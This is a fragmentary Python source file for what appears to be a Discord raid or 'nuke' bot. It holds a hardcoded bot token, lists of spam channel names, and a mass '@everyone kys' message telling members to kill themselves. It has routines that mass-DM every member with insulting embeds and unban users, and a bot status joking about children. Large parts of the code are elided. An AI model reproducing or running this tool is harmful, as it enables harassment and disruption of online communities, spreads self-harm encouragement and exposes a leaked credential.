...
token = "ODY0OTEwMDU3MzYzODY1NjIx.YO8UQg.3CZeUdgydhuYstsWZC8F8oP_Zbg"
...
SPAM_CHANNEL =  ["Obama's Step Son#1557 on top" , "imagine :laugh:" , "Obama's Step Son#1557" , "I wish the world was a wasteland","Seal gang On Top","adopted ","nuked nuked","Obama's Step Son#1557 ","So fun","Get on my level","All planned","Obama's Step Son#1557","SimpLord?"]  
SPAM_MESSAGE = ["@everyone kys "]
...
╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 ''')
   await client.change_presence(activity=discord.Game(name="with little children"))
...
async def Obama(ctx):
    ...
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("Glycon#0001")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("Beautiful")
...
async def ObamaMessage(ctx):
    ...
    for member in list(client.get_all_members()):
        ...
        try:
            embed = discord.Embed(title="u gay", description="Obama's Step Son ON TOP" , color=discord.Colour.purple())
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Sub To Ligma")
...
async def ObamaHelp(ctx):
    ...
    try:
            ...
            embed.set_footer(text="Sub to candice")
